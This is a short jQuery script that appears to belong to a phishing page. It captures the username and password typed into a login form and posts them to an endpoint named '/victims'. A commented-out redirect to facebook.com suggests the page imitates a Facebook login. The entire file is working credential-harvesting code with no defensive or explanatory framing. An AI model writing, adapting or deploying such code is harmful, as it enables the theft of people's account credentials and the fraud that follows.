$(document).ready(function(){
    $("#loginbutton").click(function(){
        let username = $("#username").val()
        let password = $("#password").val()
        $.ajax({
            type: "POST",
            url: "http://localhost:3000/victims",
            data: () => {
                return {
                    username,
                    password
                }
            },
            contentType: "application/json",
            success: (res) => {
                console.log(res)
                // window.location.href = "https://www.facebook.com"
            }
        })
    });
  });